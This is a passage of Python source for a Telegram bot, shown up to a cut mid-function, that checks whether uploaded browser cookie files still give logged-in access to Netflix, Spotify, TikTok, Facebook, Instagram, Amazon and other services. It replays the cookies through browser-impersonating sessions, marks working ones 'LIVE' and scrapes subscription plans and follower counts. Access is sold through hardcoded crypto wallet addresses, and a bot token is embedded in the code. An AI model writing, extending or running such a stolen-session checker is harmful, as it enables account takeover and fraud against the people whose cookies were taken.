import os
import logging
import asyncio
import json
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import re
from pathlib import Path
import zipfile
from io import BytesIO
import sys

def _split_cookie_path(file_path):
    p = Path(file_path)
    return p.parent.name, p.name

def _fast_print(msg):
    try:
        sys.stdout.reconfigure(line_buffering=True)
    except Exception:
        pass
    print(msg, flush=True)

try:
    from curl_cffi import requests as crequests
    HAS_CURL_CFFI = True
except ImportError:
    _fast_print("WARNING: curl_cffi not installed. Installing via pip...")
    try:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "curl_cffi"])
        from curl_cffi import requests as crequests
        HAS_CURL_CFFI = True
        _fast_print("SUCCESS: curl_cffi installed successfully")
    except Exception as e:
        _fast_print(f"ERROR: Failed to install curl_cffi: {e}")
        crequests = requests
        HAS_CURL_CFFI = False

CUSTOM_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

def parse_cookies_txt(content):
    cookies = []
    lines = content.strip().split('\n')
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) < 7:
            continue
        domain, subd_flag, path, secure_flag, expires, name, value = parts
        cookies.append({
            'domain': domain,
            'path': path,
            'secure': secure_flag.upper() == 'TRUE',
            'expires': expires,
            'name': name,
            'value': value
        })
    return cookies

def filter_cookies_by_domain(cookies, target_domains):
    filtered = []
    for cookie in cookies:
        for target_domain in target_domains:
            if cookie['domain'] == target_domain or cookie['domain'].endswith(target_domain):
                filtered.append(cookie)
                break
    return filtered

def get_status_icon(status):
    if status == 'success':
        return "✅"
    elif status == 'dead':
        return "❌"
    else:
        return ""

def get_status_text(status):
    if status == 'success':
        return "Valid cookie."
    elif status == 'dead':
        return "Invalid or expired cookie."
    elif status == 'no_cookies':
        return "No cookies found for this service."
    elif status == 'error':
        return "Error while checking cookie."
    else:
        return "Unknown cookie status."

def extract_public_plan_info(plan_info):
    if not plan_info:
        return None
    idx = plan_info.find("Plan:")
    if idx == -1:
        return None
    text = plan_info[idx:].strip()
    if ' - ' in text:
        text = text.split(' - ', 1)[0]
    if len(text) > 120:
        text = text[:117] + "..."
    return text

def clean_filename(text):
    if not text or not text.strip():
        return "unnamed"
    invalid_chars = ['<', '>', ':', '"', '/', '\\', '|', '?', '*', '\x00']
    for char in invalid_chars:
        text = text.replace(char, '_')
    text = re.sub(r'[\x00-\x1f\x7f-\x9f]', '_', text)
    text = text.replace(' ', '_').replace('__', '_').strip('_.')
    windows_reserved = ['CON', 'PRN', 'AUX', 'NUL','COM1', 'COM2', 'COM3', 'COM4', 'COM5', 'COM6', 'COM7', 'COM8', 'COM9','LPT1', 'LPT2', 'LPT3', 'LPT4', 'LPT5', 'LPT6', 'LPT7', 'LPT8', 'LPT9']
    name_only = text.split('.')[0].upper()
    if name_only in windows_reserved:
        text = f"file_{text}"
    if text.replace('.', '').strip() == '':
        text = "unnamed"
    if len(text) > 200:
        text = text[:200]
    text = text.rstrip('. ')
    if not text:
        text = "unnamed"
    return text

def test_cookies_with_target(cookies, target_url, contains_text):
    if not cookies:
        return {'status': 'no_cookies','message': 'No suitable cookies found for this domain'}
    
    if 'roblox.com' in target_url.lower():
        return test_roblox_login(cookies)
    if 'instagram.com' in target_url.lower():
        return test_instagram_login(cookies)
    if 'youtube.com' in target_url.lower():
        return test_youtube_login(cookies)
    if 'linkedin.com' in target_url.lower():
        return test_linkedin_login(cookies)
    if 'amazon.com' in target_url.lower():
        return test_amazon_login(cookies)
    if 'wordpress.com' in target_url.lower():
        return test_wordpress_login(cookies)
    if 'capcut.com' in target_url.lower():
        return test_capcut_login(cookies)
    if 'facebook.com' in target_url.lower():
        required_cookies = ['c_user', 'xs']
        cookie_names = [cookie['name'] for cookie in cookies]
        missing_cookies = [cookie for cookie in required_cookies if cookie not in cookie_names]
        if missing_cookies:
            return {'status': 'no_cookies','message': f'Not enough Facebook cookies (missing: {", ".join(missing_cookies)})','final_url': target_url,'status_code': 200}
        else:
            return test_facebook_login(cookies)
    
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            session.cookies.set(cookie_name, cookie_value, domain=domain, path=cookie['path'], secure=cookie['secure'])
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        
        response = session.get(target_url, headers=headers, timeout=20, allow_redirects=True)
        final_url = str(response.url)
        status_code = response.status_code
        
        if 'login' in final_url.lower() or 'signin' in final_url.lower() or 'accounts.' in final_url.lower():
            return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': status_code}
        
        if status_code == 200:
            if 'tiktok.com' in target_url.lower():
                if 'tiktok.com/setting' in final_url.lower():
                    username = extract_tiktok_username(response.text)
                    if username:
                        profile_result = test_tiktok_profile(cookies, username)
                        if profile_result['status'] == 'success':
                            stats = profile_result['stats']
                            followers = stats['followers']
                            following = stats['following']
                            likes = stats['likes']
                            videos = stats.get('videos', '0')
                            verified = stats.get('verified', 'false')
                            plan_info = f"User: {username} | Followers: {followers} | Following: {following} | Likes: {likes} | Videos: {videos}"
                            if verified == 'true':
                                plan_info += " | Verified"
                        else:
                            plan_info = f"User: {username} | Profile: {profile_result['message']}"
                    else:
                        plan_info = 'Status: LIVE'
                    return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code,'plan_info': plan_info}
                else:
                    return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': status_code,'plan_info': 'Status: DEAD'}
            elif 'canva.com' in target_url.lower():
                canva_result = test_canva_login(cookies)
                return canva_result
            
            if 'account' in final_url.lower() or 'overview' in final_url.lower() or 'membership' in final_url.lower() or 'billing' in final_url.lower():
                plan_info = ""
                if 'spotify.com' in target_url.lower():
                    plan_info = extract_spotify_plan(response.text)
                elif 'netflix.com' in target_url.lower():
                    plan_info = extract_netflix_plan(response.text)
                return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code,'plan_info': plan_info}
            else:
                return {'status': 'unknown','message': 'Cookie UNKNOWN','final_url': final_url,'status_code': status_code}
        else:
            return {'status': 'dead','message': f'Cookie DEAD - HTTP {status_code}','final_url': final_url,'status_code': status_code}
    except Exception as e:
        return {'status': 'error','message': f'Error testing cookies: {str(e)}'}

def extract_spotify_plan(html_content):
    try:
        exact_plan_patterns = [
            r'<div[^>]*class="sc-15a2717d-5 gNnrac"[^>]*>.*?<span[^>]*class="[^"]*encore-text-title-medium[^"]*"[^>]*>([^<]+)</span>',
            r'<span[^>]*class="[^"]*encore-text-title-medium[^"]*"[^>]*>([^<]+)</span>',
            r'<div[^>]*class="[^"]*gNnrac[^"]*"[^>]*>.*?<span[^>]*>([^<]+)</span>'
        ]
        for pattern in exact_plan_patterns:
            exact_match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if exact_match:
                plan_name = exact_match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        subscription_div_patterns = [
            r'<div[^>]*class="[^"]*sc-15a2717d-5[^"]*"[^>]*>.*?<span[^>]*>([^<]+)</span>',
            r'<div[^>]*class="[^"]*gNnrac[^"]*"[^>]*>.*?<span[^>]*>([^<]+)</span>',
            r'<div[^>]*class="[^"]*dbRLzW[^"]*"[^>]*>.*?<span[^>]*>([^<]+)</span>'
        ]
        for pattern in subscription_div_patterns:
            match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if match:
                plan_name = match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        return "Plan: Unknown"
    except Exception as e:
        return f"Plan: Error when checking - {str(e)}"

def test_netflix_login(cookies):
    return test_cookies_with_target(cookies, "https://www.netflix.com/account", "Account")

def test_spotify_login(cookies):
    return test_cookies_with_target(cookies, "https://www.spotify.com/account/overview/", "Overview")

def test_tiktok_login(cookies):
    return test_cookies_with_target(cookies, "https://www.tiktok.com/setting", "Settings")

def test_roblox_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            session.cookies.set(cookie_name, cookie_value, domain=domain, path=cookie['path'], secure=cookie['secure'])
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.roblox.com/'
        }
        
        target_url = "https://www.roblox.com/home"
        response = session.get(target_url, headers=headers, timeout=20, allow_redirects=True)
        final_url = str(response.url)
        status_code = response.status_code
        
        if status_code == 200:
            if '/home' in final_url and 'login' not in final_url.lower():
                return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code,'plan_info': 'Status: LIVE'}
            else:
                return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': status_code,'plan_info': 'Status: DEAD'}
        else:
            return {'status': 'dead','message': f'Cookie DEAD - HTTP {status_code}','final_url': final_url,'status_code': status_code,'plan_info': 'Status: DEAD'}
    except Exception as e:
        return {'status': 'error','message': f'Error testing Roblox: {str(e)}','plan_info': 'Status: Error'}

def test_instagram_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            session.cookies.set(cookie_name, cookie_value, domain=domain, path=cookie['path'], secure=cookie['secure'])
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.instagram.com/'
        }
        
        target_url = "https://www.instagram.com/accounts/edit/"
        response = session.get(target_url, headers=headers, timeout=20, allow_redirects=True)
        final_url = str(response.url)
        status_code = response.status_code
        
        if status_code == 200:
            if '/accounts/edit/' in final_url:
                return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code,'plan_info': 'Status: LIVE'}
            else:
                return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': status_code,'plan_info': 'Status: DEAD'}
        else:
            return {'status': 'dead','message': f'Cookie DEAD - HTTP {status_code}','final_url': final_url,'status_code': status_code,'plan_info': 'Status: DEAD'}
    except Exception as e:
        return {'status': 'error','message': f'Error testing Instagram: {str(e)}','plan_info': 'Status: Error'}

def extract_netflix_plan(html_content):
    try:
        exact_plan_patterns = [
            r'<h3[^>]*data-uia="account-membership-page\+plan-card\+title"[^>]*class="[^"]*"[^>]*>([^<]+)</h3>',
            r'<h3[^>]*class="[^"]*"[^>]*>([^<]+)</h3>',
            r'<div[^>]*class="[^"]*default-ltr-cache-1rvukw7[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>'
        ]
        for pattern in exact_plan_patterns:
            exact_match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if exact_match:
                plan_name = exact_match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        membership_div_patterns = [
            r'<div[^>]*class="[^"]*default-ltr-cache-1rvukw7[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>',
            r'<div[^>]*class="[^"]*e1devdx33[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>'
        ]
        for pattern in membership_div_patterns:
            match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if match:
                plan_name = match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        return "Plan: Unknown"
    except Exception as e:
        return f"Plan: Error when checking - {str(e)}"

def extract_tiktok_username(html_content):
    try:
        pattern = r'"uniqueId":"([^"]+)"'
        matches = re.findall(pattern, html_content)
        if matches:
            return matches[0]
        return None
    except Exception:
        return None

def extract_tiktok_profile_stats(html_content):
    try:
        patterns = {
            'followers': r'"followerCount":(\d+)',
            'following': r'"followingCount":(\d+)',
            'likes': r'"heartCount":(\d+)',
            'videos': r'"videoCount":(\d+)',
            'verified': r'"verified":(true|false)',
        }
        stats = {}
        for key, pattern in patterns.items():
            match = re.search(pattern, html_content)
            stats[key] = match.group(1) if match else "0"
        return stats
    except Exception:
        return {'followers': '0','following': '0','likes': '0','videos': '0','verified': 'false'}

def test_tiktok_profile(cookies, username):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            session.cookies.set(cookie_name, cookie_value, domain=domain, path=cookie['path'], secure=cookie['secure'])
        
        headers = {'User-Agent': CUSTOM_USER_AGENT}
        profile_url = f"https://www.tiktok.com/@{username}"
        response = session.get(profile_url, headers=headers, timeout=15, allow_redirects=True)
        final_url = str(response.url)
        status_code = response.status_code
        
        if status_code == 200 and f'@{username}' in final_url:
            stats = extract_tiktok_profile_stats(response.text)
            return {'status': 'success','stats': stats,'final_url': final_url,'status_code': status_code}
        else:
            return {'status': 'error','message': f'Cannot access profile page: {status_code}','final_url': final_url,'status_code': status_code}
    except Exception as e:
        return {'status': 'error','message': f'Error accessing profile: {str(e)}'}

def test_facebook_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            session.cookies.set(cookie_name, cookie_value, domain=domain, path=cookie['path'], secure=cookie['secure'])
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        facebook_url = "https://www.facebook.com/settings"
        response = session.get(facebook_url, headers=headers, timeout=20, allow_redirects=True)
        final_url = str(response.url)
        status_code = response.status_code
        
        if status_code == 200:
            if 'facebook.com/settings' in final_url.lower():
                return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code,'plan_info': 'Status: LIVE'}
            else:
                return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': status_code,'plan_info': 'Status: DEAD'}
        else:
            return {'status': 'dead','message': f'Cookie DEAD - HTTP {status_code}','final_url': final_url,'status_code': status_code,'plan_info': 'Status: DEAD'}
    except Exception as e:
        return {'status': 'error','message': f'Error testing Facebook: {str(e)}','plan_info': 'Status: Error'}

def test_canva_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        session.headers.update({"User-Agent": CUSTOM_USER_AGENT})
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            session.cookies.set(cookie_name, cookie_value, domain=domain, path=cookie['path'], secure=cookie['secure'])
        
        settings_url = "https://www.canva.com/settings/"
        response = session.get(settings_url, timeout=30, allow_redirects=True)
        final_url = str(response.url)
        status_code = response.status_code
        
        if status_code == 200:
            if 'canva.com/settings' in final_url.lower():
                plan_info = "Plan: Unknown"
                try:
                    billing_response = session.get("https://www.canva.com/settings/billing-and-teams", timeout=15)
                    if billing_response.status_code == 200:
                        plan_info = extract_canva_plan(billing_response.text)
                except Exception:
                    plan_info = "Plan: Unknown"
                return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code,'plan_info': plan_info}
            else:
                return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': status_code,'plan_info': 'Status: DEAD'}
        else:
            return {'status': 'dead','message': f'Cookie DEAD - HTTP {status_code}','final_url': final_url,'status_code': status_code,'plan_info': 'Status: DEAD'}
    except Exception as e:
        return {'status': 'error','message': f'Error testing Canva login: {str(e)}','plan_info': 'Status: Error'}

def extract_canva_plan(html_content):
    try:
        auto_plan_patterns = [
            r'<h4[^>]*class="[^"]*"[^>]*>([^<]+)</h4>',
            r'<div[^>]*class="[^"]*plan[^"]*"[^>]*>([^<]+)</div>',
            r'<div[^>]*class="[^"]*subscription[^"]*"[^>]*>([^<]+)</div>'
        ]
        detected_plans = []
        for pattern in auto_plan_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE | re.DOTALL)
            for match in matches:
                plan_text = match.strip()
                if 3 < len(plan_text) < 50:
                    skip_words = ['button', 'menu', 'nav', 'header', 'footer']
                    if not any(skip in plan_text.lower() for skip in skip_words):
                        plan_indicators = ['pro', 'free', 'premium', 'basic', 'business', 'team']
                        if any(indicator in plan_text.lower() for indicator in plan_indicators):
                            detected_plans.append(plan_text)
        
        if detected_plans:
            return f"Plan: {detected_plans[0]}"
        return "Plan: Unknown"
    except Exception as e:
        return f"Plan: Error - {str(e)}"

def test_linkedin_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(cookie['name'],cookie['value'],domain=domain,path=cookie['path'],secure=cookie['secure'])
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.linkedin.com/'
        }
        
        target_url = "https://www.linkedin.com/mypreferences/d/categories/account"
        response = session.get(target_url, headers=headers, timeout=20, allow_redirects=False)
        status_code = response.status_code
        final_url = str(response.url)
        
        if status_code in [301, 302, 303, 307, 308]:
            redirect_location = response.headers.get('Location', '')
            if '/uas/login' in redirect_location:
                return {'status': 'dead','message': 'Cookie DEAD','final_url': redirect_location,'status_code': status_code}
        elif status_code == 200:
            return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code}
        else:
            return {'status': 'unknown','message': 'Unexpected response','final_url': final_url,'status_code': status_code}
    except Exception as e:
        return {'status': 'error','message': f'Error testing LinkedIn login: {str(e)}'}

def test_amazon_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(cookie['name'],cookie['value'],domain=domain,path=cookie['path'],secure=cookie['secure'])
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.amazon.com/'
        }
        
        target_url = "https://www.amazon.com/gp/your-account/order-history"
        response = session.get(target_url, headers=headers, timeout=20, allow_redirects=False)
        status_code = response.status_code
        final_url = str(response.url)
        
        if status_code in [301, 302, 303, 307, 308]:
            redirect_location = response.headers.get('Location', '')
            if '/signin' in redirect_location or '/ap/signin' in redirect_location:
                return {'status': 'dead','message': 'Cookie DEAD','final_url': redirect_location,'status_code': status_code}
        elif status_code == 200:
            return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code}
        else:
            return {'status': 'unknown','message': 'Unexpected response','final_url': final_url,'status_code': status_code}
    except Exception as e:
        return {'status': 'error','message': f'Error testing Amazon login: {str(e)}'}

def test_wordpress_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(cookie['name'], cookie['value'], domain=domain, path=cookie['path'], secure=cookie['secure'])
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        session.headers.update(headers)
        
        target_url = "https://wordpress.com/me/"
        response = session.get(target_url, timeout=30, allow_redirects=True)
        final_url = str(response.url)
        content = response.text
        
        authenticated_patterns = [
            r'data-user-id="(\d+)"',
            r'"user_id":(\d+)',
            r'"username":"([^"]+)"',
            r'class="[^"]*account[^"]*settings[^"]*"'
        ]
        
        auth_found = False
        for pattern in authenticated_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                auth_found = True
                break
        
        login_prompts = [
            r'Sign up or log in',
            r'Log in to WordPress\.com',
            r'class="[^"]*login-form[^"]*"'
        ]
        
        login_found = False
        for pattern in login_prompts:
            if re.search(pattern, content, re.IGNORECASE):
                login_found = True
                break
        
        if auth_found and not login_found:
            return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': response.status_code}
        elif login_found:
            return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': response.status_code}
        else:
            return {'status': 'unknown','message': 'Unclear authentication status','final_url': final_url,'status_code': response.status_code}
    except Exception as e:
        return {'status': 'error','message': f'Error testing WordPress login: {str(e)}'}

def test_youtube_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(cookie['name'],cookie['value'],domain=domain,path=cookie['path'],secure=cookie['secure'])
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        
        target_url = "https://www.youtube.com/account"
        response = session.get(target_url, headers=headers, timeout=20, allow_redirects=False)
        status_code = response.status_code
        final_url = str(response.url)
        
        if status_code in [301, 302, 303, 307, 308]:
            return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': status_code}
        elif status_code == 200:
            return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code}
        else:
            return {'status': 'unknown','message': 'Unexpected response','final_url': final_url,'status_code': status_code}
    except Exception as e:
        return {'status': 'error','message': f'Error testing YouTube login: {str(e)}'}

def test_capcut_login(cookies):
    try:
        session = crequests.Session(impersonate="chrome") if HAS_CURL_CFFI else requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(cookie['name'],cookie['value'],domain=domain,path=cookie['path'],secure=cookie['secure'])
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        
        target_url = "https://www.capcut.com/my-edit"
        response = session.get(target_url, headers=headers, timeout=20, allow_redirects=True)
        status_code = response.status_code
        final_url = str(response.url)
        html_content = response.text
        
        if final_url == 'https://www.capcut.com' or final_url == 'https://www.capcut.com/':
            return {'status': 'dead','message': 'Cookie DEAD','final_url': final_url,'status_code': status_code}
        
        plan = 'Unknown'
        pattern = r'subscribe_info["\\\s]*:["\\\s]*\{["\\\s]*flag["\\\s]*:["\\\s]*(true|false)'
        match = re.search(pattern, html_content)
        if match:
            plan = 'Pro' if match.group(1) == 'true' else 'Free'
        
        if status_code == 200 and ('my-edit' in final_url or '/my-edit' in html_content):
            return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code,'plan_info': f'Plan: {plan}'}
        else:
            return {'status': 'unknown','message': 'Unexpected response','final_url': final_url,'status_code': status_code}
    except Exception as e:
        return {'status': 'error','message': f'Error testing CapCut login: {str(e)}'}

SCAN_TARGETS = {
    "netflix": {"url": "https://www.netflix.com/account","contains": "Account","domains": [".netflix.com", "netflix.com"]},
    "spotify": {"url": "https://www.spotify.com/account/overview/","contains": "Overview","domains": [".spotify.com", "spotify.com"]},
    "tiktok": {"url": "https://www.tiktok.com/setting","contains": "Settings","domains": [".tiktok.com", "tiktok.com"]},
    "facebook": {"url": "https://www.facebook.com/settings","contains": "Settings","domains": [".facebook.com", "facebook.com"]},
    "canva": {"url": "https://www.canva.com/settings/","contains": "Settings","domains": [".canva.com", "canva.com"]},
    "roblox": {"url": "https://www.roblox.com/home","contains": "Home","domains": [".roblox.com", "roblox.com"]},
    "instagram": {"url": "https://www.instagram.com/accounts/edit/","contains": "Edit","domains": [".instagram.com", "instagram.com"]},
    "youtube": {"url": "https://www.youtube.com/account","contains": "Account","domains": [".youtube.com", "youtube.com"]},
    "linkedin": {"url": "https://www.linkedin.com/mypreferences/d/categories/account","contains": "Preferences","domains": [".linkedin.com", "linkedin.com"]},
    "amazon": {"url": "https://www.amazon.com/gp/your-account/order-history","contains": "Order","domains": [".amazon.com", "amazon.com"]},
    "wordpress": {"url": "https://wordpress.com/me/","contains": "Me","domains": [".wordpress.com", "wordpress.com"]},
    "capcut": {"url": "https://www.capcut.com/my-edit","contains": "My Edit","domains": [".capcut.com", "capcut.com"]}
}

SERVICE_TEST_FUNCTIONS = {
    'netflix': test_netflix_login,
    'spotify': test_spotify_login,
    'tiktok': test_tiktok_login,
    'facebook': test_facebook_login,
    'canva': test_canva_login,
    'roblox': test_roblox_login,
    'instagram': test_instagram_login,
    'youtube': test_youtube_login,
    'linkedin': test_linkedin_login,
    'amazon': test_amazon_login,
    'wordpress': test_wordpress_login,
    'capcut': test_capcut_login
}

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8132478896:AAHY_BiDvT4DB--MI7N2dvhBol2ubdFsh-M"
ADMIN_USER_ID = "6557052839"
CHANNEL_CHAT_ID = -1003103353083
CHANNEL_INVITE_LINK = "https://t.me/+IDNwVF4Ue1AyOTVl"
PRIVATE_BLOCK_MESSAGE = "This feature is only for admin and VIP plan users.\nPlease join our channel to use the bot."

USERS_DB_FILE = "users_db.json"

def load_users_db():
    try:
        if os.path.exists(USERS_DB_FILE):
            with open(USERS_DB_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if ADMIN_USER_ID in data:
                    data[ADMIN_USER_ID]['plan'] = 'vip'
                    data[ADMIN_USER_ID]['registered'] = True
                    if 'vip_start' not in data[ADMIN_USER_ID]:
                        data[ADMIN_USER_ID]['vip_start'] = datetime.now().isoformat()
                return data
    except Exception as e:
        logger.error(f"Error loading users database: {e}")
    return {}

def save_users_db():
    try:
        with open(USERS_DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(users_db, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Error saving users database: {e}")

users_db = load_users_db()

STATS_DB_FILE = "stats_db.json"

def load_stats_db():
    try:
        if os.path.exists(STATS_DB_FILE):
            with open(STATS_DB_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if isinstance(data, dict):
                    if 'daily_scans' not in data or not isinstance(data['daily_scans'], dict):
                        data['daily_scans'] = {}
                    return data
    except Exception as e:
        logger.error(f"Error loading stats database: {e}")
    return {'daily_scans': {}}

def save_stats_db():
    try:
        with open(STATS_DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(stats_db, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Error saving stats database: {e}")

stats_db = load_stats_db()

def increment_daily_scans(count):
    if count <= 0:
        return
    today = datetime.now().strftime("%Y-%m-%d")
    daily = stats_db.get('daily_scans')
    if not isinstance(daily, dict):
        daily = {}
    daily[today] = daily.get(today, 0) + count
    stats_db['daily_scans'] = daily
    save_stats_db()

NORMAL_PLAN_LIMIT = 30
NORMAL_PLAN_RESET_HOURS = 3

SERVICES = {
    'netflix': 'Netflix',
    'spotify': 'Spotify',
    'tiktok': 'TikTok',
    'facebook': 'Facebook',
    'canva': 'Canva',
    'roblox': 'Roblox',
    'instagram': 'Instagram',
    'youtube': 'YouTube',
    'linkedin': 'LinkedIn',
    'amazon': 'Amazon',
    'wordpress': 'WordPress',
    'capcut': 'CapCut'
}

PAYMENT_ACCOUNTS = {
    'trc20': 'TGMAfsoiFkXaJfDjCLjYXHE9MycL5Gkjok',
    'bep20': '0x209c10F0bd76BbC1b91CeFC67419Ad98fF264155'
}

def get_user_record(user_id):
    user_id_str = str(user_id)
    if user_id_str not in users_db:
        users_db[user_id_str] = {
            'plan': 'normal' if user_id_str != ADMIN_USER_ID else 'vip',
            'registered': True if user_id_str == ADMIN_USER_ID else False,
            'join_date': None,
            'file_count': 0,
            'last_reset': datetime.now().isoformat(),
            'vip_expiry': None,
            'vip_start': datetime.now().isoformat() if user_id_str == ADMIN_USER_ID else None
        }
        save_users_db()
    record = users_db[user_id_str]
    if record.get('plan') == 'vip' and 'vip_start' not in record:
        record['vip_start'] = datetime.now().isoformat()
        save_users_db()
    return record

def is_registered(user_id):
    data = get_user_record(user_id)
    return bool(data.get('registered'))

def is_restricted_private(user_id, chat_id):
    user_data = get_user_record(user_id)
    if str(user_id) == ADMIN_USER_ID:
        return False
    if user_data['plan'] == 'vip':
        return False
    if str(chat_id) == str(CHANNEL_CHAT_ID):
        return False
    return True

def can_user_scan(user_id):
    user_data = get_user_record(user_id)
    if user_data['plan'] == 'vip' and user_data.get('vip_expiry'):
